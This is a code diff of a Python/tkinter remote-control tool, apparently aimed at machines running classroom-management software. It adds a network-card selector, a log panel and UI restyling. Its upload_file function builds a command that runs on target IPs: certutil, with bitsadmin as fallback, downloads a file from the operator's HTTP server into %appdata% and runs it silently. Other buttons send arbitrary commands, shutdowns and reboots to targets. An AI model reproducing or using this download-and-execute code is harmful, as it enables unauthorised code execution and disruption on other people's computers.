         logger.error('所有端口都无法启动HTTP服务器！')
 
-# 上传文件
-def choose():
-    import os
-    import shutil
-    
-    # 检查是否选择了目标IP
-    if not TargetIP:
-        messagebox.showwarning('X提醒', '请先锁定IP！')
-        return
-    # 删除原有记录
-    dell = ('cd %appdata% && del -f -q x.txt 2>nul & exit')
-    send_cmd(dell)
-    txt5.delete(0, tk.END)
-    import tkinter.filedialog
-    path = tkinter.filedialog.askopenfilename(title='X文件选择')
-    if path:
-        # 将文件复制到程序目录（HTTP根目录）
-        program_dir = os.path.dirname(os.path.abspath(__file__))
-        file_name = os.path.basename(path)
-        dest_path = os.path.join(program_dir, file_name)
-        try:
-            shutil.copy2(path, dest_path)
-            # 保存复制后的路径到txt5
-            txt5.insert(0, dest_path)
-            print(f'文件已复制到HTTP目录: {dest_path}')
-        except Exception as e:
-            messagebox.showerror('X提醒', f'文件复制失败: {str(e)}')
+def _format_file_size(size_bytes):
+    if size_bytes < 1024:
+        return f'{size_bytes} B'
+    elif size_bytes < 1024 * 1024:
+        return f'{size_bytes / 1024:.1f} KB'
+    elif size_bytes < 1024 * 1024 * 1024:
+        return f'{size_bytes / (1024 * 1024):.1f} MB'
     else:
-        messagebox.showinfo('X提醒', '未选择文件')
+        return f'{size_bytes / (1024 * 1024 * 1024):.2f} GB'
+
+
+def _clean_old_uploads(upload_dir, max_age_hours=24):
+    import time as time_mod
+    try:
+        now = time_mod.time()
+        for fname in os.listdir(upload_dir):
+            fpath = os.path.join(upload_dir, fname)
+            if os.path.isfile(fpath):
+                age_hours = (now - os.path.getmtime(fpath)) / 3600
+                if age_hours > max_age_hours:
+                    os.remove(fpath)
+    except Exception:
+        pass
+
+
+def choose():
+    if not TargetIP:
+        messagebox.showwarning('3477提醒您', '请先锁定IP！')
+        return
+
+    txt5.delete(0, tk.END)
+
+    import tkinter.filedialog
+    path = tkinter.filedialog.askopenfilename(title='选择要上传的文件')
+    if not path:
+        return
+
+    upload_dir = os.path.join(config.get_base_path(), 'uploads')
+    if not os.path.exists(upload_dir):
+        os.makedirs(upload_dir)
+
+    _clean_old_uploads(upload_dir)
+
+    file_name = os.path.basename(path)
+    dest_path = os.path.join(upload_dir, file_name)
+
+    try:
+        shutil.copy2(path, dest_path)
+        file_size = os.path.getsize(dest_path)
+        size_str = _format_file_size(file_size)
+        txt5.insert(0, dest_path)
+        log_message(f'已选择文件: {file_name} ({size_str})', 'INFO')
+    except Exception as e:
+        messagebox.showerror('3477提醒您', f'文件复制失败: {str(e)}')
+
 
 def start_http():
-    # 启动http服务
-    # 创建线程
-    http_thr = (threading.Thread(target=http_server))
-    http_thr.daemon = True  # 守护线程
+    http_thr = threading.Thread(target=http_server)
+    http_thr.daemon = True
     http_thr.start()
+
+
 def upload_file():
-    import os
-    
     filename = txt5.get()
     if not filename:
-        messagebox.showwarning('X提醒', '请先选择文件！')
+        messagebox.showwarning('3477提醒您', '请先选择文件！')
         return
-    
-    if not os.path.exists(filename):
-        messagebox.showwarning('X提醒', '文件不存在！')
-        return
-    
-    # 检查HTTP端口
-    global http_port
-    if 'http_port' not in globals():
-        http_port = 8080  # 默认端口
-    
-    # 获取文件名
-    file_name = os.path.basename(filename)
-    
-    try:
-        # 使用certutil下载文件 - Windows自带，无需PowerShell
-        download_url = f'http://{lhost}:{http_port}/{file_name}'
-        # 改进的下载命令，添加更多错误处理
-        download_cmd = (f'cd %appdata% && '
-                       f'certutil -urlcache -split -f "{download_url}" "{file_name}" && '
-                       f'if exist "{file_name}" (start "" "{file_name}") && exit')
-        send_cmd(download_cmd)
-        
-        messagebox.showinfo('X提醒', f'文件 {file_name} 已发送！\n下载地址: {download_url}')
-        
-    except Exception as e:
-        messagebox.showerror('X提醒', f'发送失败: {str(e)}')
 
-# UI界面 - 现代化设计 + 响应式布局
+    if not os.path.exists(filename):
+        messagebox.showwarning('3477提醒您', '文件不存在！')
+        return
+
+    if not TargetIP:
+        messagebox.showwarning('3477提醒您', '请先锁定IP！')
+        return
+
+    global http_port
+    file_name = os.path.basename(filename)
+    file_size = os.path.getsize(filename)
+    size_str = _format_file_size(file_size)
+    download_url = f'http://{lhost}:{http_port}/{file_name}'
+
+    download_cmd = (
+        f'cd /d %appdata% && '
+        f'certutil -urlcache -split -f "{download_url}" "{file_name}" >nul 2>&1 && '
+        f'if exist "{file_name}" (start "" "{file_name}") & exit'
+    )
+
+    fallback_cmd = (
+        f'cd /d %appdata% && '
+        f'bitsadmin /transfer EDIST_DL /download /priority normal "{download_url}" '
+        f'"%appdata%\\{file_name}" >nul 2>&1 && '
+        f'if exist "{file_name}" (start "" "{file_name}") & exit'
+    )
+
+    full_cmd = f'{download_cmd} || {fallback_cmd}'
+
+    try:
+        send_cmd(full_cmd)
+        messagebox.showinfo('3477提醒您',
+            f'文件 {file_name} ({size_str}) 已发送！\n'
+            f'下载地址: {download_url}\n'
+            f'目标数量: {len(TargetIP)}')
+        log_message(f'文件上传: {file_name} ({size_str}) - 目标数: {len(TargetIP)}', '操作')
+    except Exception as e:
+        messagebox.showerror('3477提醒您', f'发送失败: {str(e)}')
+
+# ==================== 日志系统 ====================
+def log_message(msg, msg_type='INFO'):
+    """向日志输出区添加一条日志"""
+    import datetime
+    timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+    try:
+        log_text.insert(tk.END, f'[{timestamp}] [{msg_type}] {msg}\n')
+        log_text.see(tk.END)
+    except:
+        pass
+
+# ==================== 界面颜色常量 ====================
+BG_COLOR = '#F5F7FA'
+CARD_BG = '#FFFFFF'
+PRIMARY_COLOR = '#1E88E5'
+DANGER_COLOR = '#E53935'
+SUCCESS_COLOR = '#43A047'
+FONT_FAMILY = config.get('ui.font_family', '微软雅黑')
+
+# ==================== 主窗口 ====================
 root = tk.Tk()
 root.title(t('app.title'))
-# 居中设置
 sw = root.winfo_screenwidth()
 sh = root.winfo_screenheight()
-x = (sw-700)//2 # 2   #窗口水平位置
-y = (sh-520)//2 # 2    #窗口垂直位置
-root.geometry("700x520+%d+%d" %(x,y))
-root.config(background='honeydew')#honeydew
-root.resizable(True, True)  # 允许缩放
+x = (sw-780)//2
+y = (sh-620)//2
+root.geometry("780x620+%d+%d" %(x,y))
+root.config(background=BG_COLOR)
+root.resizable(True, True)
 
-# 配置网格权重以支持响应式
 root.columnconfigure(0, weight=1)
 root.rowconfigure(0, weight=1)
 
-# ==================== 菜单栏增强 ====================
-about = tk.Menu(root)
+# ==================== 菜单栏 ====================
+about = tk.Menu(root, bg='#FFFFFF', fg='#2C3E50', font=(FONT_FAMILY, 9))
 
-editmenu = tk.Menu(about,tearoff=False)
-editmenu.add_command(label=t('menu.version_2016'),command=ver2016)
-editmenu.add_command(label=t('menu.version_2022'),command=ver2022)
-about.add_cascade(label=t('menu.version_select'),menu=editmenu)
+editmenu = tk.Menu(about, tearoff=False)
+editmenu.add_command(label=t('menu.version_2016'), command=ver2016)
+editmenu.add_command(label=t('menu.version_2022'), command=ver2022)
+about.add_cascade(label=t('menu.version_select'), menu=editmenu)
 
-# 语言菜单
 lang_menu = tk.Menu(about, tearoff=False)
 lang_menu.add_command(label="中文 / Chinese", command=lambda: i18n.switch_language('zh_CN'))
 lang_menu.add_command(label="English", command=lambda: i18n.switch_language('en_US'))
-about.add_cascade(label="Language / 语言", menu=lang_menu)
+about.add_cascade(label="语言 / Language", menu=lang_menu)
 
-# 主题菜单
 theme_menu = tk.Menu(about, tearoff=False)
 theme_menu.add_command(label=t('themes.honeydew'), command=lambda: theme_manager.apply_theme('honeydew'))
 theme_menu.add_command(label=t('themes.dark'), command=lambda: theme_manager.apply_theme('dark'))
 theme_menu.add_command(label=t('themes.blue'), command=lambda: theme_manager.apply_theme('blue'))
 theme_menu.add_command(label=t('themes.pink'), command=lambda: theme_manager.apply_theme('pink'))
-about.add_cascade(label="Theme / 主题", menu=theme_menu)
+about.add_cascade(label="主题 / Theme", menu=theme_menu)
 
 about.add_separator()
-about.add_command(label="Update Check for Updates / 检查更新", command=lambda: update_manager.check_for_updates())
-about.add_command(label="Test Test Update Server / 测试服务器", command=lambda: update_manager.show_url_test_dialog())
+about.add_command(label="检查更新 / Check Updates", command=lambda: update_manager.check_for_updates())
 about.add_separator()
-about.add_command(label=t('menu.about_software'),command=aboutme)
+about.add_command(label=t('menu.about_software'), command=aboutme)
 root.config(menu=about)
 
-# 初始化 杀掉极域
+# 初始化
 init()
-# 启动http服务
 start_http()
 
-# ==================== 主框架 - 使用Grid布局 ====================
-main_frame = tk.Frame(root, bg='honeydew')
-main_frame.grid(row=0, column=0, sticky=(tk.N, tk.S, tk.E, tk.W), padx=10, pady=10)
-main_frame.columnconfigure(0, weight=1)  # 让主列可以扩展
+# ==================== 主容器 ====================
+main_frame = tk.Frame(root, bg=BG_COLOR)
+main_frame.grid(row=0, column=0, sticky=(tk.N, tk.S, tk.E, tk.W), padx=12, pady=8)
+main_frame.columnconfigure(0, weight=1)
+main_frame.rowconfigure(5, weight=1)
 
-# ===== 第一行：工具栏 + 目标IP =====
-toolbar_frame = tk.Frame(main_frame, bg='#e8f5e9', relief='raised', bd=1)
-toolbar_frame.grid(row=0, column=0, sticky=(tk.E, tk.W), pady=(0, 10))
+def create_btn(parent, text, bg, cmd, **kw):
+    defaults = {'font': (FONT_FAMILY, 9), 'relief': 'flat', 'bd': 0, 'padx': 10, 'pady': 3, 'fg': 'white'}
+    defaults.update(kw)
+    return tk.Button(parent, text=text, bg=bg, command=cmd, **defaults)
 
-b13=tk.Button(toolbar_frame,text=t('buttons.kill_jy'),font=('楷体',12),bg='#4caf50',fg='white',command=killjy,width=12)
-b13.pack(side='left', padx=5, pady=5)
+# ===== Row 0: 工具栏/IP设置卡片 =====
+toolbar_card = tk.Frame(main_frame, bg=CARD_BG, highlightbackground='#E0E0E0', highlightthickness=1)
+toolbar_card.grid(row=0, column=0, sticky=(tk.E, tk.W), pady=(0, 6))
+toolbar_card.columnconfigure(2, weight=1)
 
-# 分隔符
-separator1 = ttk.Separator(toolbar_frame, orient='vertical')
-separator1.pack(side='left', fill='y', padx=5)
+b13 = create_btn(toolbar_card, t('buttons.kill_jy'), '#FF7043', killjy, padx=12, pady=4, font=(FONT_FAMILY, 10, 'bold'))
+b13.grid(row=0, column=0, padx=8, pady=6, sticky='w')
 
-ip_frame = tk.Frame(toolbar_frame, bg='#e8f5e9')
-ip_frame.pack(side='left', padx=10, pady=5)
+ip_frame = tk.Frame(toolbar_card, bg=CARD_BG)
+ip_frame.grid(row=0, column=1, padx=8, pady=6, sticky='w')
 
-lb1 = tk.Label(ip_frame,text=t('labels.target_ip'),font=('楷体',12),bg='#e8f5e9',fg='#2e7d32').pack(side='left')
-txt1 = tk.Entry(ip_frame,font=('楷体',12),width=18,fg='red')
-txt1.pack(side='left', padx=5)
+lb1 = tk.Label(ip_frame, text=t('labels.target_ip'), font=(FONT_FAMILY, 10), bg=CARD_BG, fg='#455A64')
+lb1.pack(side='left')
+txt1 = tk.Entry(ip_frame, font=(FONT_FAMILY, 10), width=16, fg='#C62828', relief='solid', bd=1)
+txt1.pack(side='left', padx=4)
 
-lb6 = tk.Label(ip_frame,text=t('labels.ip_count'),font=('楷体',11),bg='#e8f5e9',fg='#2e7d32').pack(side='left', padx=(10,0))
-txt4 = tk.Entry(ip_frame,font=('楷体',11),width=3,fg='red')
-txt4.pack(side='left', padx=5)
+lb6 = tk.Label(ip_frame, text=t('labels.ip_count'), font=(FONT_FAMILY, 10), bg=CARD_BG, fg='#455A64')
+lb6.pack(side='left', padx=(10,0))
+txt4 = tk.Entry(ip_frame, font=(FONT_FAMILY, 10), width=4, fg='#C62828', relief='solid', bd=1)
+txt4.pack(side='left', padx=4)
 
-# 分隔符
-separator2 = ttk.Separator(toolbar_frame, orient='vertical')
-separator2.pack(side='left', fill='y', padx=5)
+ip_btn_frame = tk.Frame(toolbar_card, bg=CARD_BG)
+ip_btn_frame.grid(row=0, column=2, padx=8, pady=6, sticky='e')
 
-# IP操作按钮
-ip_btn_frame = tk.Frame(toolbar_frame, bg='#e8f5e9')
-ip_btn_frame.pack(side='left', padx=5, pady=5)
-
-b11 = tk.Button(ip_btn_frame,text=t('buttons.lock_all'),font=('楷体',11),bg='#2196f3',fg='white',command=lock,width=10)
+b11 = create_btn(ip_btn_frame, t('buttons.lock_all'), '#1E88E5', lock)
 b11.pack(side='left', padx=2)
-
-b12 = tk.Button(ip_btn_frame,text=t('buttons.lock_target'),font=('楷体',11),bg='#ff9800',fg='white',command=release,width=10)
+b12 = create_btn(ip_btn_frame, t('buttons.lock_target'), '#FB8C00', release)
 b12.pack(side='left', padx=2)
-
-b10=tk.Button(ip_btn_frame,text=t('buttons.detect_ip'),font=('楷体',11),bg='#9c27b0',fg='white',command=SearchIp,width=8)
+b10 = create_btn(ip_btn_frame, t('buttons.detect_ip'), '#7B1FA2', SearchIp)
 b10.pack(side='left', padx=2)
 
-# ===== 第二行：打开程序区域 =====
-program_frame = tk.LabelFrame(main_frame, text=t('labels.open_program'), font=('楷体',11,'bold'), 
-                               bg='honeydew', fg='#1565c0', padx=10, pady=5)
-program_frame.grid(row=1, column=0, sticky=(tk.E, tk.W), pady=5)
+# ===== 网卡选择区域 =====
+nic_frame = tk.Frame(toolbar_card, bg=CARD_BG)
+nic_frame.grid(row=1, column=0, columnspan=3, padx=8, pady=(0, 6), sticky='ew')
+nic_frame.columnconfigure(0, weight=1)
+
+nic_label = tk.Label(nic_frame, text=t('labels.network_card'), font=(FONT_FAMILY, 9), bg=CARD_BG, fg='#455A64')
+nic_label.pack(side='left', padx=(0, 4))
+
+# 获取所有网卡接口
+nic_list = get_all_network_interfaces()
+nic_options = [f"{n['name']} ({n['ip']})" for n in nic_list]
+nic_ip_map = {f"{n['name']} ({n['ip']})": n['ip'] for n in nic_list}
+
+nic_var = tk.StringVar()
+nic_combo = ttk.Combobox(nic_frame, textvariable=nic_var, values=nic_options, state='readonly', width=35)
+nic_combo.pack(side='left', padx=4)
+
+# 设置当前选中项
+current_display = next((opt for opt in nic_options if nic_ip_map.get(opt) == lhost), None)
+if current_display:
+    nic_var.set(current_display)
+elif nic_options:
+    nic_var.set(nic_options[0])
+
+def on_nic_change(event):
+    selected = nic_var.get()
+    ip = nic_ip_map.get(selected)
+    if ip:
+        switch_network_card(ip)
+
+nic_combo.bind('<<ComboboxSelected>>', on_nic_change)
+
+# ===== Row 1: 打开程序 =====
+program_frame = tk.LabelFrame(main_frame, text=t('labels.open_program'), font=(FONT_FAMILY, 10, 'bold'),
+                               bg=CARD_BG, fg=PRIMARY_COLOR, padx=12, pady=6, relief='solid', bd=1)
+program_frame.grid(row=1, column=0, sticky=(tk.E, tk.W), pady=3)
 
 var1 = tk.IntVar()
 var2 = tk.IntVar()
 var3 = tk.IntVar()
 var4 = tk.IntVar()
 
-check_frame = tk.Frame(program_frame, bg='honeydew')
+check_frame = tk.Frame(program_frame, bg=CARD_BG)
 check_frame.pack(fill=tk.X)
 
-chek1 = tk.Checkbutton(check_frame,text=t('programs.cmd'),font=('楷体',12),variable=var1, bg='honeydew',onvalue=1, offvalue=0)
-chek1.pack(side='left', padx=10)
-chek2 = tk.Checkbutton(check_frame,text=t('programs.calculator'),font=('楷体',12),variable=var2,bg='honeydew', onvalue=1, offvalue=0)
-chek2.pack(side='left', padx=10)
-chek3 = tk.Checkbutton(check_frame,text=t('programs.notepad'),font=('楷体',12),variable=var3,bg='honeydew',  onvalue=1, offvalue=0)
-chek3.pack(side='left', padx=10)
-chek4 = tk.Checkbutton(check_frame,text=t('programs.paint'),font=('楷体',12),variable=var4,bg='honeydew',  onvalue=1, offvalue=0)
-chek4.pack(side='left', padx=10)
+chk_style = {'font': (FONT_FAMILY, 10), 'bg': CARD_BG, 'onvalue': 1, 'offvalue': 0}
+chek1 = tk.Checkbutton(check_frame, text=t('programs.cmd'), variable=var1, **chk_style)
+chek1.pack(side='left', padx=6)
+chek2 = tk.Checkbutton(check_frame, text=t('programs.calculator'), variable=var2, **chk_style)
+chek2.pack(side='left', padx=6)
+chek3 = tk.Checkbutton(check_frame, text=t('programs.notepad'), variable=var3, **chk_style)
+chek3.pack(side='left', padx=6)
+chek4 = tk.Checkbutton(check_frame, text=t('programs.paint'), variable=var4, **chk_style)
+chek4.pack(side='left', padx=6)
 
-b2=tk.Button(program_frame,text=t('buttons.open'),font=('楷体',12),command=openfile,width=8,bg='#673ab7',fg='white')
-b2.pack(side='right', padx=10)
+b2 = create_btn(program_frame, t('buttons.open'), PRIMARY_COLOR, openfile, padx=16)
+b2.pack(side='right', padx=4)
 
-# ===== 第三行：发送消息区域 =====
-msg_frame = tk.LabelFrame(main_frame, text=t('labels.send_message'), font=('楷体',11,'bold'),
-                          bg='honeydew', fg='#c62828', padx=10, pady=5)
-msg_frame.grid(row=2, column=0, sticky=(tk.E, tk.W), pady=5)
+# ===== Row 2: 发送消息 =====
+msg_frame = tk.LabelFrame(main_frame, text=t('labels.send_message'), font=(FONT_FAMILY, 10, 'bold'),
+                           bg=CARD_BG, fg=PRIMARY_COLOR, padx=12, pady=6, relief='solid', bd=1)
+msg_frame.grid(row=2, column=0, sticky=(tk.E, tk.W), pady=3)
 
-msg_input_frame = tk.Frame(msg_frame, bg='honeydew')
-msg_input_frame.pack(fill=tk.X)
+msg_input_frame = tk.Frame(msg_frame, bg=CARD_BG)
+msg_input_frame.pack(fill=tk.X, expand=True)
 
-txt2 = tk.Entry(msg_input_frame,font=('楷体',12),width=40)
-txt2.pack(side='left', fill=tk.X, expand=True, padx=(0, 10))
+txt2 = tk.Entry(msg_input_frame, font=(FONT_FAMILY, 10), relief='solid', bd=1)
+txt2.pack(side='left', fill=tk.X, expand=True, padx=(0, 8))
 
-b1 = tk.Button(msg_input_frame,text=t('buttons.send'),font=('楷体',12),command=send_msg,width=8,bg='#1976d2',fg='white')
+b1 = create_btn(msg_input_frame, t('buttons.send'), PRIMARY_COLOR, send_msg, padx=16)
 b1.pack(side='right')
 
-# ===== 第四行：执行命令区域 =====
-cmd_frame = tk.LabelFrame(main_frame, text=t('labels.execute_command'), font=('楷体',11,'bold'),
-                          bg='honeydew', fg='#6a1b9a', padx=10, pady=5)
-cmd_frame.grid(row=3, column=0, sticky=(tk.E, tk.W), pady=5)
+# ===== Row 3: 执行命令 =====
+cmd_frame = tk.LabelFrame(main_frame, text=t('labels.execute_command'), font=(FONT_FAMILY, 10, 'bold'),
+                           bg=CARD_BG, fg=PRIMARY_COLOR, padx=12, pady=6, relief='solid', bd=1)
+cmd_frame.grid(row=3, column=0, sticky=(tk.E, tk.W), pady=3)
 
-cmd_input_frame = tk.Frame(cmd_frame, bg='honeydew')
-cmd_input_frame.pack(fill=tk.X)
+cmd_input_frame = tk.Frame(cmd_frame, bg=CARD_BG)
+cmd_input_frame.pack(fill=tk.X, expand=True)
 
-txt3 = tk.Entry(cmd_input_frame,font=('楷体',12),width=35)
-txt3.pack(side='left', fill=tk.X, expand=True, padx=(0, 10))
+txt3 = tk.Entry(cmd_input_frame, font=(FONT_FAMILY, 10), relief='solid', bd=1)
+txt3.pack(side='left', fill=tk.X, expand=True, padx=(0, 8))
 
-# 预设命令按钮
-template_btn = tk.Button(cmd_input_frame, text="Templates Templates", font=('楷体',10),
-                         command=show_command_templates, bg='#78909c', fg='white')
+template_btn = create_btn(cmd_input_frame, '常用模板 ▼', '#78909C', show_command_templates)
 template_btn.pack(side='right', padx=2)
 
-b3 = tk.Button(cmd_input_frame,text=t('buttons.execute'),font=('楷体',12),command=send_cmd,width=7,bg='#d32f2f',fg='white')
+b3 = create_btn(cmd_input_frame, t('buttons.execute'), DANGER_COLOR, send_cmd, padx=16)
 b3.pack(side='right', padx=2)
 
-# ===== 第五行：文件上传区域 =====
-upload_frame = tk.LabelFrame(main_frame, text="File Upload / 文件上传", font=('楷体',11,'bold'),
-                             bg='honeydew', fg='#00695c', padx=10, pady=5)
-upload_frame.grid(row=4, column=0, sticky=(tk.E, tk.W), pady=5)
+# ===== Row 4: 文件上传 =====
+upload_frame = tk.LabelFrame(main_frame, text=t('labels.file_upload'), font=(FONT_FAMILY, 10, 'bold'),
+                              bg=CARD_BG, fg=PRIMARY_COLOR, padx=12, pady=6, relief='solid', bd=1)
+upload_frame.grid(row=4, column=0, sticky=(tk.E, tk.W), pady=3)
 
-upload_input_frame = tk.Frame(upload_frame, bg='honeydew')
-upload_input_frame.pack(fill=tk.X)
+upload_input_frame = tk.Frame(upload_frame, bg=CARD_BG)
+upload_input_frame.pack(fill=tk.X, expand=True)
 
-chose_file = tk.Button(upload_input_frame,text=t('buttons.choose_file'),font=('楷体',11),command=choose,width=10, bg='#00796b',fg='white')
+chose_file = create_btn(upload_input_frame, t('buttons.choose_file'), SUCCESS_COLOR, choose)
 chose_file.pack(side='left')
 
-txt5 = tk.Entry(upload_input_frame,font=('楷体',11),width=30)
-txt5.pack(side='left', fill=tk.X, expand=True, padx=10)
+txt5 = tk.Entry(upload_input_frame, font=(FONT_FAMILY, 10), relief='solid', bd=1)
+txt5.pack(side='left', fill=tk.X, expand=True, padx=8)
 
-b_file= tk.Button(upload_input_frame,text=t('buttons.upload_execute'),font=('楷体',11),command=upload_file,width=11,bg='#388e3c',fg='white')
+b_file = create_btn(upload_input_frame, t('buttons.upload_execute'), '#2E7D32', upload_file)
 b_file.pack(side='right')
 
-# ===== 第六行：危险操作按钮区域 =====
-danger_frame = tk.LabelFrame(main_frame, text=" Danger Zone / 危险操作区", font=('楷体',11,'bold'),
-                             bg='honeydew', fg='#b71c1c', padx=10, pady=5)
-danger_frame.grid(row=5, column=0, sticky=(tk.E, tk.W), pady=5)
+# ===== Row 5: 底部区域（日志 + 危险操作） =====
+bottom_frame = tk.Frame(main_frame, bg=BG_COLOR)
+bottom_frame.grid(row=5, column=0, sticky=(tk.N, tk.S, tk.E, tk.W), pady=(6, 0))
+bottom_frame.columnconfigure(0, weight=3, minsize=280)
+bottom_frame.columnconfigure(1, weight=2, minsize=180)
+bottom_frame.rowconfigure(0, weight=1)
 
-btn_row1 = tk.Frame(danger_frame, bg='honeydew')
-btn_row1.pack(fill=tk.X, pady=2)
+# 左侧：操作日志
+log_frame = tk.Frame(bottom_frame, bg=CARD_BG, highlightbackground='#E0E0E0', highlightthickness=1)
+log_frame.grid(row=0, column=0, sticky=(tk.N, tk.S, tk.E, tk.W), padx=(0, 4))
 
-b4 = tk.Button(btn_row1,text=t('buttons.shutdown'),font=('楷体',11),command=shutdown,width=8,bg='#f44336',fg='white')
-b4.pack(side='left', padx=5)
-b5= tk.Button(btn_row1,text=t('buttons.reboot'),font=('楷体',11),command=reboot,width=8,bg='#ff5722',fg='white')
-b5.pack(side='left', padx=5)
-b6= tk.Button(btn_row1,text=t('buttons.lock_screen'),font=('楷体',11),command=sleep,width=8,bg='#795548',fg='white')
-b6.pack(side='left', padx=5)
-b7 = tk.Button(btn_row1,text=t('buttons.sign_in'),font=('楷体',11),command=sign,width=8,bg='#607d8b',fg='white')
-b7.pack(side='left', padx=5)
-b8 = tk.Button(btn_row1,text=t('buttons.close_app'),font=('楷体',11),command=closeapp,width=9,bg='#9c27b0',fg='white')
-b8.pack(side='right', padx=5)
+log_header = tk.Frame(log_frame, bg='#37474F')
+log_header.pack(fill=tk.X)
+tk.Label(log_header, text='操作日志', font=(FONT_FAMILY, 9, 'bold'), bg='#37474F', fg='#ECEFF1').pack(side='left', padx=8, pady=3)
+clear_log_btn = tk.Button(log_header, text='清空', font=(FONT_FAMILY, 8),
+                           command=lambda: log_text.delete(1.0, tk.END),
+                           bg='#546E7A', fg='white', relief='flat', bd=0, padx=6, pady=1)
+clear_log_btn.pack(side='right', padx=6, pady=2)
+
+log_text_frame = tk.Frame(log_frame, bg='#263238')
+log_text_frame.pack(fill=tk.BOTH, expand=True)
+
+log_text = tk.Text(log_text_frame, font=('Consolas', 9), bg='#263238', fg='#B2CCD6',
+                   relief='flat', bd=0, padx=6, pady=4, height=7)
+log_text.pack(side='left', fill=tk.BOTH, expand=True)
+log_scroll = tk.Scrollbar(log_text_frame, command=log_text.yview)
+log_scroll.pack(side='right', fill='y')
+log_text.configure(yscrollcommand=log_scroll.set)
+
+log_message('程序已启动', 'INFO')
+log_message(f'本地IP: {lhost} | 端口: {Port}', 'INFO')
+
+# 右侧：危险操作区
+danger_frame = tk.LabelFrame(bottom_frame, text='危险操作区', font=(FONT_FAMILY, 9, 'bold'),
+                              bg='#FFF5F5', fg=DANGER_COLOR, padx=8, pady=6,
+                              relief='solid', bd=1, highlightbackground='#EF9A9A', highlightthickness=1)
+danger_frame.grid(row=0, column=1, sticky=(tk.N, tk.S, tk.E, tk.W), padx=(4, 0))
+
+danger_inner = tk.Frame(danger_frame, bg='#FFF5F5')
+danger_inner.pack(expand=True, fill=tk.BOTH)
+
+dbtn_style = {'font': (FONT_FAMILY, 9), 'relief': 'flat', 'bd': 0, 'padx': 8, 'pady': 5, 'fg': 'white'}
+
+b4 = tk.Button(danger_inner, text='关机', bg=DANGER_COLOR, command=shutdown, **dbtn_style)
+b4.grid(row=0, column=0, padx=3, pady=3, sticky='ew')
+b5 = tk.Button(danger_inner, text='重启', bg='#F4511E', command=reboot, **dbtn_style)
+b5.grid(row=0, column=1, padx=3, pady=3, sticky='ew')
+b6 = tk.Button(danger_inner, text='锁屏', bg='#6D4C41', command=sleep, **dbtn_style)
+b6.grid(row=1, column=0, padx=3, pady=3, sticky='ew')
+b7 = tk.Button(danger_inner, text='签到', bg='#546E7A', command=sign, **dbtn_style)
+b7.grid(row=1, column=1, padx=3, pady=3, sticky='ew')
+
+danger_inner.columnconfigure(0, weight=1)
+danger_inner.columnconfigure(1, weight=1)
 
 # ===== 状态栏 =====
-status_bar = tk.Frame(root, bg='#37474f', height=25)
+status_bar = tk.Frame(root, bg='#37474F', height=26)
 status_bar.grid(row=1, column=0, sticky=(tk.E, tk.W))
 status_bar.grid_propagate(False)
 
-status_label = tk.Label(status_bar, text=f"Ready | IP: {lhost} | Port: {Port} | Language: {i18n.current_language}", 
-                        font=('Consolas', 9), bg='#37474f', fg='#eceff1')
+status_label = tk.Label(status_bar,
+                         text=f"就绪 | IP: {lhost} | Port: {Port} | 语言: {i18n.current_language}",
+                         font=(FONT_FAMILY, 9), bg='#37474F', fg='#ECEFF1')
 status_label.pack(side='left', padx=10)
 
-version_label = tk.Label(status_bar, text=f"v{config.get('app.version')} | Theme: {theme_manager.current_theme}", 
-                        font=('Consolas', 9), bg='#37474f', fg='#90a4ae')
+version_label = tk.Label(status_bar,
+                          text=f"v{config.get('app.version')} | 主题: {theme_manager.current_theme}",
+                          font=(FONT_FAMILY, 9), bg='#37474F', fg='#90A4AE')
 version_label.pack(side='right', padx=10)
 
 def check_open_click():
@@ -2174,7 +2530,7 @@ def check_open_click():
         # 禁用按钮
         open_button_disabled = True
         b2.config(state='disabled', text='等待120秒')
-        messagebox.showwarning('X提醒', '点击频率过高！请等待120秒后再试。')
+        messagebox.showwarning('3477提醒您', '点击频率过高！请等待120秒后再试。')
         
         # 开始倒计时恢复
         root.after(1000, countdown_recover_open_button, 119)
@@ -2189,55 +2545,60 @@ def countdown_recover_open_button(remaining):
         b2.config(text=f'等待{remaining}秒')
         root.after(1000, countdown_recover_open_button, remaining - 1)
     else:
-        # 恢复按钮
         open_button_disabled = False
         open_click_times.clear()
-        b2.config(state='normal', text='打开', fg='purple')
-        messagebox.showinfo('X提醒', '按钮已恢复使用！')
+        b2.config(state='normal', text=t('buttons.open'), bg=PRIMARY_COLOR, fg='white')
+        messagebox.showinfo('3477提醒您', '按钮已恢复使用！')
 
 # 显示启动公告
 def show_announcement():
     announcement = """
-    ╔════════════════════════════════════════════════════╗
-    ║        EDIST v3.4 - NEW 重大更新公告             ║
-    ╠════════════════════════════════════════════════════╣
-    ║                                                    ║
-    ║  【 多语言支持】                                ║
-    ║  ✓ 支持中文 / English 双语切换                   ║
-    ║  ✓ 菜单栏 Language 选项可随时切换                ║
-    ║  ✓ 完整的界面翻译                                ║
-    ║                                                    ║
-    ║  【Modern 现代化UI设计】                              ║
-    ║  ✓ 全新Grid响应式布局（支持窗口缩放）           ║
-    ║  ✓ 工具栏设计 + 功能分区                         ║
-    ║  ✓ 彩色按钮 + 状态栏显示                        ║
-    ║  ✓ LabelFrame分组展示                            ║
-    ║                                                    ║
-    ║  【Theme 主题定制系统】                              ║
-    ║  ✓ 蜜瓜绿 (Honeydew) - 默认清新主题              ║
-    ║  ✓ 暗黑模式 (Dark Mode) - 护眼深色主题           ║
-    ║  ✓ 天空蓝 (Sky Blue) - 专业商务主题              ║
-    ║  ✓ 樱花粉 (Cherry Blossom) - 温馨可爱主题        ║
-    ║  ✓ 菜单栏 Theme 选项一键切换                     ║
-    ║                                                    ║
-    ║  【⚡ 批量操作优化】                              ║
-    ║  ✓ 并发发送机制（10线程并发）                    ║
-    ║  ✓ 实时进度条显示                               ║
-    ║  ✓ 操作结果统计报告                             ║
-    ║  ✓ 30秒超时保护                                 ║
-    ║                                                    ║
-    ╚════════════════════════════════════════════════════╝
+    ╔═══════════════════════════════════════════════════════╗
+    ║        EDIST v3.8 - 网卡切换功能优化版           ║
+    ╠═══════════════════════════════════════════════════════╣
+    ║                                                       ║
+    ║  【网卡切换功能】                                     ║
+    ║  ✓ 支持多网卡环境下自由切换网卡接口                 ║
+    ║  ✓ 自动识别所有网络接口并显示友好名称                ║
+    ║  ✓ 切换后自动更新HTTP服务器绑定IP                   ║
+    ║  ✓ 网卡选择自动保存至配置文件                       ║
+    ║                                                       ║
+    ║  【文件上传功能优化】                                  ║
+    ║  ✓ 新增专用 uploads 上传目录，避免污染程序目录       ║
+    ║  ✓ 文件大小自动显示（B/KB/MB/GB）                   ║
